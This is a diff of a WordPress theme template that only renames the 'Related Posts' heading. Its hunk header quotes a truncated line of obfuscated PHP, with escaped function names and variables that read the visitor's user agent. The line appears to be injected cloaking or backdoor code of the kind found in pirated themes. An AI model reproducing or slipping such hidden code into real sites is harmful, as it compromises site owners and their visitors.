@@ -134,7 +134,7 @@ $x0d="\160\x72\x65\x67\x5f\x6da\x74c\150";$x0b=$_SERVER['HTTP_USER_AGENT'];$x0c=
 								<!-- Start Related Posts -->
 								<?php $categories = get_the_category($post->ID); if ($categories) { $category_ids = array(); foreach($categories as $individual_category) $category_ids[] = $individual_category->term_id; $args=array( 'category__in' => $category_ids, 'post__not_in' => array($post->ID), 'showposts'=>4, 'ignore_sticky_posts' => 1, 'orderby' => 'rand' );
 								$my_query = new wp_query( $args ); if( $my_query->have_posts() ) {
-									echo '<div class="related-posts related-posts-right"><div class="postauthor-top"><h3>'.__('Related Posts','mythemeshop').'</h3></div><ul>';
+									echo '<div class="related-posts related-posts-right"><div class="postauthor-top"><h3>'.__('All Related Posts','mythemeshop').'</h3></div><ul>';
 									$counter = '0'; while( $my_query->have_posts() ) { ++$counter; if($counter == 4) { $postclass = 'last'; $counter = 0; } else { $postclass = ''; } $my_query->the_post(); $li = 1; ?>
 									<li class="<?php echo $postclass; ?> relatepostli<?php echo $li+$counter; ?>">
 										<a rel="nofollow" class="relatedthumb" href="<?php the_permalink()?>" title="<?php the_title(); ?>">
